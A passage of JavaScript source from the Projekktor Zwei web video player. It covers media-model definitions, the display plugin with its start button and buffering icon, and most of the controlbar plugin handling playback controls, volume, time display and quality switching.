		    setTimeout(arguments.callee,200);	
		} else if (dest[ref.flashVerifyMethod]==undefined) {
		    setTimeout(arguments.callee,200);	
		} else {
		    ref._setBufferState('full');
		    ref.flashReadyListener();
                    $('#' + $(ref.mediaElement).attr('id') + "_cc").css({
                        width: '100%',
                        height: '100%'
                    })
		}
                
	    } catch(e) {
		setTimeout(arguments.callee,200);
	    }
	   
	})();
    },
    
    _setState: function(state) {
	var ref = this;
	state = state.toUpperCase();
	if (this._currentState!=state) {
	    
	    if (this._currentState=='PAUSED' && state=='PLAYING') {
		this.sendUpdate('resume', this.media);
                this._isPlaying = true;
	    }

	    if ( (this._currentState=='IDLE' || this._currentState=='STARTING') && state=='PLAYING') {
		this.sendUpdate('start', this.media);
                this._isPlaying = true;
	    }
            
            if (state=='PAUSED')
                 this._isPlaying = false;
	    
	    if (state=='ERROR') {		
		this.setPlay = this.setPause = function() {
		    ref.sendUpdate('start');
		}
	    }
	    this._currentState = state.toUpperCase();
	    this.sendUpdate('state', this._currentState);
	}
    },
    
    _setBufferState: function(state) { 
	if (this._currentBufferState!=state.toUpperCase()) {	
	    this._currentBufferState = state.toUpperCase();
	    this.sendUpdate('buffer', this._currentBufferState);	    
	}
    },

    _scaleVideo: function(promote) {
        var destContainer = this.pp.getMediaContainer();
	if (this.pp.getIsMobileClient()) return;
	try {	    
	    var wid = destContainer.width(),
		hei = destContainer.height(),	
		tw = this.media.videoWidth,
	    	th = this.media.videoHeight;
	
	    if ($p.utils.stretch(this.pp.getConfig('videoScaling'), this.mediaElement, wid, hei, tw, th)) {
		this.sendUpdate('scaled', {
		    realWidth: tw,
		    realHeight: th,
		    displayWidth: wid,
		    displayHeight: hei
		});
	    }
	} catch(e) {};
	
    },
    
    _isFF: function() {
        return navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
    }
   

};
});
/*
 * this file is part of: 
 * projekktor zwei
 * 
 *
 * Copyright 2010, 2011, Sascha Kluger, Spinning Airwhale Media, http://www.spinningairwhale.com
 * under GNU General Public License
 * http://www.filenew.org/projekktor/license/
*/
jQuery(function($) {
$p.newModel({
    modelId: 'NA',
    iLove: [
        {ext:'NaN', type:'none/none', platform:'browser'}
    ],    
    hasGUI: true,
    
    applyMedia: function(destContainer) {

        destContainer.html('');
        
        var ref = this;
        
        this.mouseClick = function(evt){
            ref.pp.removeListener('mousedown', arguments.callee);
            ref._setState('completed');
        };
        
        this.displayReady();

        if (this.pp.getConfig('enableTestcard') && !this.pp.getIsMobileClient()) {
            this.setTestcard( (this.media.file[0].src!=null && this.media.errorCode===7) ? 5 : this.media.errorCode);
            this.pp.addListener('mousedown', mouseClick);
        } else {
            // this.applyImage(this.media.config.poster, destContainer);
            this.applyCommand ('stop');
            window.location.href = this.media.file[0].src;            
        }
    },
    
    detachMedia: function() {
	this.pp.removeListener('leftclick', this.mouseClick)        
    }
    

});
});
/*
 * this file is part of: 
 * projekktor zwei
 * http://filenew.org/projekktor/
 *
 * Copyright 2010, 2011, Sascha Kluger, Spinning Airwhale Media, http://www.spinningairwhale.com
 * under GNU General Public License
 * http://www.filenew.org/projekktor/license/
*/
jQuery(function($) {
$p.newModel({
    
    modelId: 'PLAYLIST',
    
    iLove: [
        {ext:'json', type:'text/json', platform:'browser'},
        {ext:'jsonp', type:'text/jsonp', platform:'browser'},	    
        {ext:'xml', type:'text/xml', platform:'browser'},
        {ext:'json', type:'application/json', platform:'browser'},
        {ext:'jsonp', type:'application/jsonp', platform:'browser'},	    
        {ext:'xml', type:'application/xml', platform:'browser'}        
    ],
    
    applyMedia: function(destContainer) {
        this.displayReady();
    },
        
    setPlay: function() {
        this.sendUpdate('playlist', this.media);          
    }        
});
});
/*
 * Projekktor II Plugin: Display
 * VERSION: 1.1
 * DESC: Provides a standard display for cover-art, video or html content
 * features startbutton, logo-overlay and buffering indicator
 * Copyright 2010-2013, Sascha Kluger, Spinning Airwhale Media, http://www.spinningairwhale.com
 *
 * under GNU General Public License
 * /license/
 */
var projekktorDisplay = function(){};
jQuery(function($) {
projekktorDisplay.prototype = {
    
    logo: null,
    logoIsFading: false,
    
    display: null,
    
    displayClicks: 0,
    
    buffIcn: null,
    buffIcnSprite: null,
    bufferDelayTimer: null,
    
    _controlsDims: null,
    
    config: {
	
	displayClick:		{callback: 'setPlayPause', value: null},
	displayPlayingClick:	{callback: 'setPlayPause', value: null},
	displayDblClick:	{callback: null, value: null},
        
        staticControls:         false,
	
	/* time to delay buffering-icon-overlay once "waiting" event has been triggered */
	bufferIconDelay: 	1000,
        
        designMode:             false,
	
	/* if set the indicator animation is tinkered from a cssprite - must be horizontal */
	spriteUrl:		'',
	spriteWidth:		50,
	spriteHeight:		50,
	spriteTiles:		25,
	spriteOffset:		1,
	spriteCountUp:		false
	
    },
    
    
    /* triggered on plugin-instanciation */
    initialize: function() {
	// create the display container itself
	this.display = this.applyToPlayer($('<div/>'));
	
	// create the startbutton
	this.startButton =  this.applyToPlayer( $('<div/>').addClass('start'), 'startbtn');

	// create buffericon
	this.buffIcn = this.applyToPlayer( $('<div/>').addClass('buffering'), 'buffericn');

        this.setActive();

	// add spritelayer to buffericon (if required)
	if (this.config.spriteUrl!='') {
	    this.buffIcnSprite = $('<div/>')
		.appendTo(this.buffIcn)
		.css({
		    width: this.config.spriteWidth,
		    height: this.config.spriteHeight,
		    marginLeft: ((this.buffIcn.width()-this.config.spriteWidth) / 2)+"px",
		    marginTop: ((this.buffIcn.height()-this.config.spriteHeight) / 2)+"px",
		    backgroundColor: 'transparent',
		    backgroundImage: 'url('+this.config.spriteUrl+')',
		    backgroundRepeat: 'no-repeat',
		    backgroundPosition: '0 0'
		})
		.addClass('inactive')
	}	
		
	// create a dedicated media container (if none exists)
	this.pp.getMediaContainer();
        /*
        this.display
            .append(this.startButton)
            .append(this.buffIcn)        
*/
	this.pluginReady = true;
    },



    /*****************************************
        EVENT HANDLERS
    *****************************************/
    displayReadyHandler: function() {
	var ref = this;

	// the startbutton
    	this.startButton.unbind().click(function(){
	    ref.pp.setPlay();
	});
        
        this.hideStartButton();
    },

    syncingHandler: function() {
	this.showBufferIcon();
	if (this.pp.getState('IDLE'))
            this.hideStartButton();	    
    },
    
    readyHandler: function() {
	this.hideBufferIcon();
	if (this.pp.getState('IDLE'))
            this.showStartButton();	    
    },    
    
    bufferHandler: function(state) {

	if (!this.pp.getState('PLAYING') && !this.pp.getState('AWAKENING'))
	    return;
	if (state=='EMPTY') this.showBufferIcon();
	else this.hideBufferIcon();
    },    
    
    stateHandler: function(state) {
        
        
        switch(state) {
	    
	    case 'IDLE':
                clearTimeout(this._cursorTimer);
		this.display.css('cursor', 'pointer');
		break;
            
            case 'STARTING':
                this.showBufferIcon();
                this.hideStartButton();
                break;
            
            case 'PLAYING':
                this.hideBufferIcon();
                this.hideStartButton();
                break;
            
            case 'IDLE':
                this.showStartButton();
                break;
            
            case 'AWAKENING':
                // this.hideBufferIcon();;
                this.hideStartButton();
                break;
            
            case 'ERROR':
                this.hideBufferIcon();;
                this.hideStartButton();
                break;
            
            case 'COMPLETED':
                this.hideBufferIcon();;
                break;            
            
            default:
                this.hideStartButton();
        }
        

	
    },
    
    startHandler: function() {
        this.mousemoveHandler();  
    },
  
    stoppedHandler: function() {
	this.hideBufferIcon();
    },
  
    scheduleLoadingHandler: function() {
	 this.hideStartButton();
	 this.showBufferIcon(); 
    },
    
    scheduledHandler: function() {
	if (!this.getConfig('autoplay')) {
	    this.showStartButton();
	}
	
	this.hideBufferIcon();
    },
 
    plugineventHandler: function(data) {
        if (data.PLUGIN=='controlbar' && data.EVENT=='show' && this.getConfig('staticControls')) {
            var pctCtrl = data.height * 100 / this.pp.getDC().height();
            this.display.height( (100 - pctCtrl) + "%").data('sc', true);
        }
    },
    
    qualityChangeHandler: function() {
        this.hideBufferIcon();
    },

    /*****************************************,
        DISPLAY: Mouse Handling
    *****************************************/    
    mousemoveHandler: function(evt) {
        var dest = this.display;
        if (this.pp.getState('IDLE')) {
            dest.css('cursor', 'pointer');
            return;
        }
        dest.css('cursor', 'auto');
        clearTimeout(this._cursorTimer);
        if ("AWAKENING|ERROR|PAUSED".indexOf(this.pp.getState())==-1)
            this._cursorTimer=setTimeout(function(){dest.css('cursor', 'none');}, 3000);
    },
    
    mousedownHandler: function(evt) {

	var ref = this;     
        	
	if( ($(evt.target).attr('id') || '').indexOf('_media')==-1)
	    return;

        clearTimeout(this._cursorTimer);
        this.display.css('cursor', 'auto');                    
            
	if(evt.which!=1)
	    return;            

	switch(this.pp.getState()) {
	    case 'ERROR':
                this.pp.setConfig({disallowSkip: false});
		this.pp.setActiveItem('next');
		return;
	    case 'IDLE':
		this.pp.setPlay();
		return;
	    
	}
	
	if (this.pp.getHasGUI()==true) 	    
	    return;

	this.displayClicks++;
	
	if (this.displayClicks > 0) {
	    setTimeout(
		function(){		    
		    if(ref.displayClicks == 1) {
			if (ref.pp.getState()=='PLAYING')
			    ref.clickHandler('displayPlaying');			
			else 
			    ref.clickHandler('display');
		    } else if(ref.displayClicks == 2) {
			ref.clickHandler('displayDbl');
		    }
		    ref.displayClicks = 0;
		}, 250
	    );	
	}
	return;
    },
    
    
    /*****************************************
        STARTBUTTON
    *****************************************/      
    showStartButton: function() {
        this.startButton.addClass('active').removeClass('inactive');	
    },
    
    hideStartButton: function() {
        this.startButton.addClass('inactive').removeClass('active');	
    },
    
    
    /*****************************************
        BUFFERICON: fader and animator
    *****************************************/       
    hideBufferIcon: function() {
        var ref=this;
	clearTimeout(this.bufferDelayTimer);
        this.buffIcn.addClass('inactive').removeClass('active');
    },
        
    showBufferIcon: function(instant) {                        
	var ref=this;

        clearTimeout(this.bufferDelayTimer);

	if (this.pp.getHasGUI())
	    return;
	
	if ( (this.pp.getModel()==='YTAUDIO' || this.pp.getModel()==='YTVIDEO') && !this.pp.getState('IDLE'))
	    instant=true;

        if (instant!=true && this.getConfig('bufferIconDelay')>0) {
            this.bufferDelayTimer=setTimeout(function(){ref.showBufferIcon(true);},this.getConfig('bufferIconDelay'));	    
	    return;
        }

	if (this.buffIcn.hasClass('active') ) return;
	this.buffIcn.addClass('active').removeClass('inactive');

        if (ref.buffIcnSprite==null) return;
        var startOffset=(ref.config.spriteCountUp==true) ? 0 : (ref.config.spriteHeight + ref.config.spriteOffset)*(ref.config.spriteTiles-1),
            spriteOffset = startOffset;
        ref.buffIcnSprite.addClass('active').removeClass('inactive');
        (function() {

            if (!ref.buffIcn.is(':visible')) return;
            ref.buffIcnSprite.css('backgroundPosition', '0px -'+spriteOffset+"px")
            
            if (ref.config.spriteCountUp==true)
                spriteOffset += ref.config.spriteHeight + ref.config.spriteOffset;
            else
                spriteOffset -= ref.config.spriteHeight + ref.config.spriteOffset;
                
            if (spriteOffset > (startOffset+ref.config.spriteHeight)*ref.config.spriteTiles || spriteOffset<ref.config.spriteOffset) spriteOffset = startOffset;
            
    
            setTimeout(arguments.callee,60);
        })(); 

    }
}
});
/*
 * Projekktor II Plugin: cb
 * VERSION: 1.0
 * DESC: Adds a fully features cb element to the player
 * Copyright 2010-2013 Sascha Kluger, Spinning Airwhale Media, http://www.spinningairwhale.com
 *
 * under GNU General Public License
 * /license/
 */
var projekktorControlbar = function(){};
jQuery(function($) {
projekktorControlbar.prototype = {
    
    _cTimer: null,
    _noHide: false,
    _wasSeeking: false,
    _cFading: false,
    _vSliderAct: false,
    _storeVol: null,
    _timeTags: {},
    cb: null,
    _pos: {left:0,right:0},

    controlElements: {},
    
    controlElementsConfig: {
	'sec_dur':null,
	'min_dur':null,
	'hr_dur':null,
	'sec_elp':null,
	'min_elp':null,
	'hr_elp':null,
	'sec_rem':null,
	'min_rem':null,
	'hr_rem':null,
	'sec_tip':null,
	'min_tip':null,
	'hr_tip':null,        
        
	'cb': null,
                
        
	'playhead':{ on:null, call:null},        
	'loaded': null, // { on:['touchstart', 'click'], call:'scrubberClk'},
	'scrubber': null, // { on:['touchstart', 'click'], call:'scrubberClk'},
        'scrubbertip': null,
        'scrubberknob': null,
	'scrubberdrag':[ { on:['mouseenter'], call:'scrubberShowTooltip'}, {on:['mouseout'], call:'scrubberHideTooltip'}, {on:['mousemove'], call:'scrubberdragTooltip'}, {on:['mousedown'], call:'scrubberdragStartDragListener'}],
	
	'play':[{ on:['touchstart', 'click'], call:'playClk'}, { on:['touchend'], call:'touchEnd'}],
	'pause':[{ on:['touchstart', 'click'], call:'pauseClk'}, { on:['touchend'], call:'touchEnd'}],
	'stop':[{ on:['touchstart', 'click'], call:'stopClk'}, { on:['touchend'], call:'touchEnd'}],
	'prev':[{ on:['touchstart', 'click'], call:'prevClk'}, { on:['touchend'], call:'touchEnd'}],
	'next':[{ on:['touchstart', 'click'], call:'nextClk'}, { on:['touchend'], call:'touchEnd'}],
	'rewind':[{ on:['touchstart', 'click'], call:'rewindClk'}, { on:['touchend'], call:'touchEnd'}],
	'forward':[{ on:['touchstart', 'click'], call:'forwardClk'}, { on:['touchend'], call:'touchEnd'}],
        
	'fsexit':[{ on:['touchstart', 'click'], call:'exitFullscreenClk'}, { on:['touchend'], call:'touchEnd'}],
	'fsenter':[{ on:['touchstart', 'click'], call:'enterFullscreenClk'}, { on:['touchend'], call:'touchEnd'}],

	'loquality':[{ on:['touchstart', 'click'], call:'setQualityClk'}, { on:['touchend'], call:'touchEnd'}],
        'hiquality':[{ on:['touchstart', 'click'], call:'setQualityClk'}, { on:['touchend'], call:'touchEnd'}],
	
	'vslider':[{ on:['touchstart', 'click'], call:'vsliderClk'}, { on:['touchend'], call:'touchEnd'}],
	'vmarker':[{ on:['touchstart', 'click'], call:'vsliderClk'}, { on:['touchend'], call:'touchEnd'}],
	'vknob':{ on: ['mousedown'], call:'vknobStartDragListener'},
        
	'volumePanel': [{on:['mousemove'], call:'volumeBtnHover'}, {on: ['mouseout'], call:'volumeBtnOut'}],
        'volume': null,
        
	'mute':[ {on:['touchstart', 'click'], call:'muteClk'}, { on: ['mouseout'], call:'volumeBtnOut'}, {on:['mousemove'], call:'volumeBtnHover'}, { on:['touchend'], call:'touchEnd'}],
	'unmute': [{on:['touchstart', 'click'], call:'unmuteClk'}, { on: ['mouseout'], call:'volumeBtnOut'}, {on:['mousemove'], call:'volumeBtnHover'}, { on:['touchend'], call:'touchEnd'}],
	'vmax': [{on:['touchstart', 'click'], call:'vmaxClk'}, { on: ['mouseout'], call:'volumeBtnOut'}, {on:['mousemove'], call:'volumeBtnHover'}, { on:['touchend'], call:'touchEnd'}],
        	
	'open':[{ on:['touchstart', 'click'], call:'openCloseClk'}, { on:['touchend'], call:'touchEnd'}],
	'close':[{ on:['touchstart', 'click'], call:'openCloseClk'}, { on:['touchend'], call:'touchEnd'}],
	'loop':[{ on:['touchstart', 'click'], call:'loopClk'}, { on:['touchend'], call:'touchEnd'}],
	'draghandle':{ on: ['mousedown'], call:'handleStartDragListener'},	
	
	'controls': null,
	'title': null
    },
        
    config: {
	/* Plugin: cb - enable/disable fade away of overlayed controls */
	toggleMute:		false,
        showCuePoints:		false,	
	fadeDelay: 		2500,
	showOnStart:		false,
        showOnIdle:		false,
	
	/* Default layout */		
	controlsTemplate: 	'<ul class="left"><li><div %{play}></div><div %{pause}></div></li></ul><ul class="right"><li><div %{fsexit}></div><div %{fsenter}></div></li><li><div %{loquality}></div><div %{hiquality}></div></li><li><div %{vmax}></div></li><li><div %{vslider}><div %{vmarker}></div><div %{vknob}></div></div></li><li><div %{mute}></div></li><li><div %{timeleft}>%{hr_elp}:%{min_elp}:%{sec_elp} | %{hr_dur}:%{min_dur}:%{sec_dur}</div></li><li><div %{next}></div></li><li><div %{prev}></div></li></ul><ul class="bottom"><li><div %{scrubber}><div %{loaded}></div><div %{playhead}></div><div %{scrubberdrag}></div></div></li></ul>'	
    },
    
    
    
    initialize: function() {
	
	var ref = this,
	    playerHtml = this.playerDom.html(),
	    useTemplate = true,
	    classPrefix = this.pp.getNS();
	    
	// check if ANY control element already exists	    
	for(var i in this.controlElementsConfig) {
	    if (playerHtml.match(new RegExp(classPrefix+i, 'gi'))) {
		useTemplate = false;
		break;
	    }	    
	}

	if (useTemplate) {	    
	    this.cb = this.applyToPlayer($(('<div/>')).addClass('controls'));
	    this.applyTemplate(this.cb, this.getConfig('controlsTemplate'));	    
	} else {
	    this.cb = this.playerDom.find( "."+classPrefix+'controls' );
	}

	// find (inter)active elements	
	for (var i in this.controlElementsConfig) {
	    this.controlElements[i] = $(this.playerDom).find('.'+classPrefix+i);	    
	    $p.utils.blockSelection( $(this.controlElements[i]) );	    
	}

	this.addGuiListeners();
	this.hidecb(true);
	this.pluginReady = true;
    },

    /* parse and apply controls dom-template */
    applyTemplate: function(dest, templateString) {
	var ref = this,
	    classPrefix = this.pp.getNS();
	    
	// apply template string if required:
	if (templateString) {
	    // replace tags by class derictive
	    var tagsUsed = templateString.match(/\%{[a-zA-Z_]*\}/gi);
	    if (tagsUsed!=null) {
		$.each(tagsUsed, function(key, value) {
		    var cn = value.replace(/\%{|}/gi, '');
		    if (value.match(/\_/gi) ) {
                        // replace with span markup
                        templateString = templateString.replace(value, '<span class="'+classPrefix+cn+'"></span>');		
		    } else {
                        // replace with className
			templateString = templateString.replace(value, 'class="'+classPrefix+cn+'"');
		    }
		});
	    }
	    dest.html(templateString);
	}
    },


    itemHandler: function(data) {	
        var volume = parseFloat(this.cookie('volume'));
        
	$(this.cb).find('.' + this.pp.getNS() + 'cuepoint').remove();
	
        this._storeVol = (volume!=null && !isNaN(volume)) ? volume : this.getConfig('volume');

	this.pp.setVolume(this._storeVol)
	this.updateDisplay();	
	this.hidecb(true);
	this.drawTitle();
        this.displayQualityToggle();
	this.pluginReady = true;	
    },
    
    startHandler: function() {
	this.pp.setVolume(this._storeVol);
	if (this.getConfig('showOnStart')==true) {
	    this.showcb(true);            
        } else {
	    this.hidecb(true);
        }
    },
    
    readyHandler: function(data) {
	clearTimeout(this._cTimer);	            	
        if (this.getConfig('showOnIdle')) {
            this.showcb(true);
            this.cb.removeClass('inactive').addClass('active').show();
        }
	this.pluginReady = true;
    },
    
    durationChangeHandler: function(dur) {  
        this.displayCuePoints(dur);
    },
    
    updateDisplay: function() {
	var ref = this,
	    state = this.pp.getState();
	
	// clearTimeout(this._cTimer);
	
	if (this.pp.getHasGUI()) return;

	// nothing to do
        if (this.getConfig('controls')==false) {
            this.hidecb(true);
	    return;
	}
	
	// prev / next button
	if (this.pp.getItemCount()<2 || this.getConfig('disallowSkip')) {
	    this._active('prev', false);
	    this._active('next', false);
	} else {
	    this._active('prev', true);
	    this._active('next', true);
	}
	
	if (this.pp.getItemIdx()<1) {
	    this._active('prev', false);
	}
	
	if (this.pp.getItemIdx()>=this.pp.getItemCount()-1) {
	    this._active('next', false);
	}

	// play / pause button
	if (this.getConfig('disablePause')) {
	    this._active('play', false);
	    this._active('pause', false);
	} else {
	    if (state==='PLAYING') this.drawPauseButton();
	    if (state==='PAUSED') this.drawPlayButton();
	    if (state==='IDLE') this.drawPlayButton();
	}

	// stop button
        this._active('stop', state!=='IDLE');
	
	
	
	// rewind & forward
	this._active('forward', state!=='IDLE');
	this._active('rewind', state!=='IDLE');


	// fullscreen button	
	if (this.pp.getInFullscreen()===true) {
	    this.drawExitFullscreenButton();
	} else {
	    this.drawEnterFullscreenButton();
	}
	

        
	if (!this.getConfig('enableFullscreen') || this.getConfig('isCrossDomain')) {
	    this._active('fsexit', false);
	    this._active('fsenter', false);
	}
        

	// loop button
	this._active('loop', this.pp.getConfig('loop'));
	
        // hd / sd toggl
        this.displayQualityToggle();
        
	// init time display
	this.displayTime()

	// init volume display
	this.displayVolume(this._storeVol);	
    },
        
    stateHandler: function(state) {

	this.updateDisplay();
        
	if ('STOPPED|AWAKENING|IDLE|DONE'.indexOf(state)>-1) { 
	    this.displayTime(0,0,0);
	    this.displayProgress(0);
            if (this.pp.getIsMobileClient()) {
                this.hidecb(true);
            }
	}
        
	if ('STOPPED|DONE|IDLE'.indexOf(state)>-1) {	  
	    this.hidecb(true);
	    return;
	}        
        
        if ('ERROR'.indexOf(state)>-1) {
            this._noHide = false;
            this.hidecb(true);
        }
	
        this.displayProgress();
    },

    scheduleModifiedHandler: function() {
	if (this.pp.getState()==='IDLE') return;
	this.updateDisplay();
        this.displayTime();
	this.displayProgress();
    },  

    volumeHandler: function(value) {
	if (this.getConfig('fixedVolume')!=true && value!=0) {
	    this.cookie('volume', value);    
	}
	// this._storeVol = value;
	this.displayVolume(value);
    },  

    progressHandler: function(obj) {
	this.displayProgress();
    },
    
    timeHandler: function(obj) {
        this.displayTime();
	this.displayProgress();
    },
    
    qualityChangeHandler: function(qual) {        
        this.displayQualityToggle(qual);
    },

    fullscreenHandler: function(inFullscreen) {

	var ref=this,
	    classPrefix = this.pp.getNS();
	
	clearTimeout(this._cTimer);

	this._noHide = false;
	this._cFading = false;
	this._vSliderAct = false;	
	
	if (!this.getConfig('controls')) return;
	if (!this.getConfig('enableFullscreen') || this.getConfig('isCrossDomain')) return;

	if (inFullscreen) {
	    this.cb.addClass('fullscreen');
	    this.drawExitFullscreenButton();
	} else {
	    this.cb.removeClass('fullscreen');
	    this.drawEnterFullscreenButton();
	}

	if (this.pp.getState()=='IDLE' && !this.getConfig('showOnIdle')) 
	    this.hidecb(true);
    },
    
    /* assign listener methods to controlbar elements */
    addGuiListeners: function() {
	var ref = this;
	
	// if (!this.getConfig('controls')) return;
	
	$.each(this.controlElementsConfig, function(key, elmCfg) {	    
	    
            if (elmCfg==null) {
		return true;
            }
            
            if (!(elmCfg instanceof Array)) {
                elmCfg = [elmCfg]
            }
            
            for (var subset=0; subset<elmCfg.length; subset++) {
                
                if (elmCfg[subset].on==null) continue;
                
                $.each(elmCfg[subset].on, function(evtKey, eventName) {                

                    // thanx to FF3.6 this approach became a little complicated:
                    var isSupported = ("on"+eventName in window.document),
                        callback = elmCfg[subset].call;
                        
                    if (!isSupported) {
                        var el = document.createElement('div')
                        el.setAttribute("on"+eventName, 'return;');
                        isSupported = (typeof el["on"+eventName] == 'function');
                        
                    }
    
                    if (isSupported) {
                        ref.controlElements[ key ].bind(eventName,  function(event) {
                            ref.clickCatcher(event, callback, ref.controlElements[ key ]);		
                        });
                        
                    }
                    
                });
                
           }
	});
	this.cb.mousemove(function(event){ref.controlsFocus(event); });		
	this.cb.mouseout(function(event){ref.controlsBlur(event); });	        	
    },
    
    /* generic click handler for all controlbar buttons */
    clickCatcher: function(evt, callback, element) {
        var ref = this;
        
	evt.stopPropagation();
        evt.preventDefault();
        $p.utils.log('Controlbar: Click', element, callback, evt)
	this[callback](evt, element);
                
	return false;
    },
    
    
    touchEnd: function() {
        
        var ref = this;
        this._cTimer=setTimeout(function(){ref.hidecb();}, this.getConfig('fadeDelay'));
        this._noHide = false;
    },
    
    
    /*******************************
        DOM Manipulations
    *******************************/      
    drawTitle: function() {	 
        this.controlElements['title'].html( this.getConfig('title', ''));
    },
    
    hidecb: function(instant) {
	
	clearTimeout(this._cTimer);	

        if (this.cb==null) return;

        // no controls at all:
	if (this.getConfig('controls')==false) {
	    this.cb.removeClass('active').addClass('inactive');
	    return;
	}

	if (instant)
	    this._noHide = false;

	// don´t hide nao
        if (this._noHide || this.cb.hasClass('inactive'))
            return;

        this.cb.removeClass('active').addClass('inactive');
        this.sendEvent('hide', this.cb);

    },

    showcb: function(fade) {

        var ref = this;
        
        // always clear timeout, stop animations
        clearTimeout(this._cTimer);

	// hide for current playback component
	if (this.pp.getHasGUI() || this.getConfig('controls')==false) {
	    this.cb.removeClass('active').addClass('inactive');           
	    return;
	}

	// player is IDLEing
	if (this.cb==null) return;
	if ("IDLE|AWAKENING|ERROR".indexOf(this.pp.getState())>-1 && fade!=true) return;	

	// is visible  restart timer:
	if (this.cb.hasClass('active') && fade!==false) {
            this._cTimer=setTimeout(function(){ref.hidecb();}, this.getConfig('fadeDelay'));
            return;
        };
	
	// show up:
	this.cb.removeClass('inactive').addClass('active');
	this.sendEvent('show', this.cb);	
    },
    
    displayTime: function(pct, dur, pos) {

    	if (this.pp.getHasGUI()) return;

        var percent = Math.round( (pct || this.pp.getLoadPlaybackProgress() || 0)*10)/10,
            duration = dur || this.pp.getDuration() || 0,
            position = pos || this.pp.getPosition() || 0,
            times = $.extend({}, this._clockDigits(duration, 'dur'), this._clockDigits(position, 'elp'), this._clockDigits(duration-position, 'rem'));

        // limit updates
        if (this.controlElements['playhead'].data('pct')!=percent) {

            // update scrubber:
            this.controlElements['playhead'].data('pct', percent).css({width: percent+"%"});
            this.controlElements['scrubberknob'].css({left: percent+"%"});   
    
            // update numeric displays
            for(var key in this.controlElements) {
                if (key=='cb')
                    break;
                
                if (times[key]) {
                    $.each(this.controlElements[key], function() {                   
                        $(this).html(times[key]);
                    });
                }
            }            
        }

    },
        
    displayProgress: function() {
        var percent = Math.round( this.pp.getLoadProgress()*10 ) / 10;
        
        // limit updates
        if (this.controlElements['loaded'].data('pct')!=percent) {
            this.controlElements['loaded'].data('pct', percent).css("width", percent+"%");
        };
    },

    displayVolume: function(volume) {
        
        var ref = this;
        
        if (this._vSliderAct==true) return;
	if (volume==null) return;

	var isVisible = this.cb.hasClass('active'),
	    ref = this,
            fixed = this.getConfig('fixedVolume'),
	    toggleMute = ( this.controlElements['mute'].hasClass('toggle') || this.controlElements['unmute'].hasClass('toggle') || this.getConfig('toggleMute') );

	// hide volume mess in case volume is fixed
	this._active('mute', !fixed);
	this._active('unmute', !fixed);
	this._active('vmax', !fixed);
	this._active('vknob', !fixed);
	this._active('vmarker', !fixed);
	this._active('vslider', !fixed);
	
        if (fixed) return;
	
	// make controls visible in order to allow dom manipulations
	// this.cb.stop(true, true).show();
	if (this.controlElements['vslider'].width() > this.controlElements['vslider'].height()) {
	    this.controlElements['vmarker'].css('width', volume * 100 +"%");
	    this.controlElements['vknob'].css('left', volume * 100 +"%");
	} else {
	    this.controlElements['vmarker'].css('height', volume * 100 +"%");
	    this.controlElements['vknob'].css('bottom', volume * 100 +"%");
	}
        
        // "li" hack
        var lis = this.controlElements['volume'].find('li'),
            set = lis.length - Math.ceil((volume * 100)/lis.length);
            
        for (var i=0; i<=lis.length; i++) {
            if (i>=set) $(lis[i]).addClass('active');
            else $(lis[i]).removeClass('active');
        }

        
	if (toggleMute) {
	    switch(parseFloat(volume)) {        
		case 0:	    
		    this._active('mute', false);
		    this._active('unmute', true);
		    this._active('vmax', true);
		    break;
		
		default:
		    this._active('mute', true);
		    this._active('unmute', false);
		    this._active('vmax', false);
		   //  vknob.css('left', volume*(vslider.width()-(vknob.width()/2))+"px");  
		    break;             
	    }
	}
                
        // hide again - if necessary
	if (isVisible) {
            this.cb.fadeTo(1, .99).fadeTo(1, 1, function() {
                ref.cb.removeAttr( 'style' ); 
            })
        }
    },

    displayCuePoints: function(duration) {

        var ref = this,
            prefix = this.pp.getNS();

        if (!this.getConfig('showCuePoints'))
            return;
        
        ref.controlElements['scrubber'].remove( '.' + prefix + 'cuepoint' );        
        
        $.each(this.pp.getCuePoints() || [], function() {
	    
            var blipWidth = Math.max( 100 / duration, Math.round(duration/100), 1),
            // Math.max( (this.off - this.off / duration, Math.round(duration/100), 1),
                blipPos = (this.on*100/duration) - ((blipWidth / 2)*100/duration),
                that = this,
                player = ref.pp,
                blip = $(document.createElement('div'))
                    .addClass(prefix + 'cuepoint')
                    .addClass('inactive')
                    .css('left', blipPos+"%" )
                    .css('width', blipWidth+"%")                    
                    .data('on', this.on);
                    
            if (this.title!='')
                blip.attr('title', this.title);
                
            this.addListener('unlock', function() {               
                $(blip).removeClass('inactive').addClass('active');
                blip.click(function() {ref.pp.setPlayhead(blip.data('on'))})
            });
            
            ref.controlElements['scrubber'].append( blip );        
        
        })
	
    },
    
    drawPauseButton: function(event) {
	this._active('pause', true);
	this._active('play', false);
    },
    
    drawPlayButton: function(event) {
	this._active('pause', false);
	this._active('play', true);	
    },
    
    
    drawEnterFullscreenButton: function(event) {
	this._active('fsexit', false);
	this._active('fsenter', true);		
    },

    drawExitFullscreenButton: function(event) {
	this._active('fsexit', true);
	this._active('fsenter', false);		
    },
    
    displayQualityToggle: function(qual) {

        var qualsCfg = this.getConfig('playbackQualities'),
            qualsItm = this.pp.getPlaybackQualities(),
            classPrefix = this.pp.getNS();
            best = [];

        // off
        if (qualsItm.length<2 || qualsCfg.length<2) {
            this.controlElements['loquality'].removeClass().addClass('inactive').addClass(classPrefix+'loquality').data('qual', '');
            this.controlElements['hiquality'].removeClass().addClass('inactive').addClass(classPrefix+'hiquality').data('qual', '');
            return;
        }
                
        // get two best variants
        qualsCfg.sort(function(a, b) {
            return a.minHeight - b.minHeight;
        });        
        for(var i = qualsCfg.length; i--; i>0) {
            if ($.inArray(qualsCfg[i].key, qualsItm) > -1)
                best.push(qualsCfg[i].key);
            if (best.length>1)
                break;
        }

        this.cb.addClass('qualities');
        if ( best[0] == this.pp.getPlaybackQuality() ) {
            this._active('loquality', true).addClass('qual'+best[1]).data('qual', best[1]);
            this._active('hiquality', false).addClass('qual'+best[0]).data('qual', best[0]);
        }
        else {
            this._active('loquality', false).addClass('qual'+best[1]).data('qual', best[1]);
            this._active('hiquality', true).addClass('qual'+best[0]).data('qual', best[0]);
        }
    },

    
   /*******************************
        Player Event Handlers
    *******************************/
    errorHandler: function(value) {
	this.hidecb(true);
    },
    
    leftclickHandler: function() {
        this.mouseleaveHandler();
    },
    
    focusHandler: function(evt) {        
	this.showcb();           
    },
    
    mousemoveHandler: function(evt) {        
        if (this.pp.getState('STARTING')) return;
	this.showcb();            	
    },
    
    
   /*******************************
        ControlUI Event LISTENERS
    *******************************/
    controlsFocus: function(evt) {
        this._noHide = true;       
    },
     
    controlsBlur: function(evt) {
        this._noHide = false;
    },
    
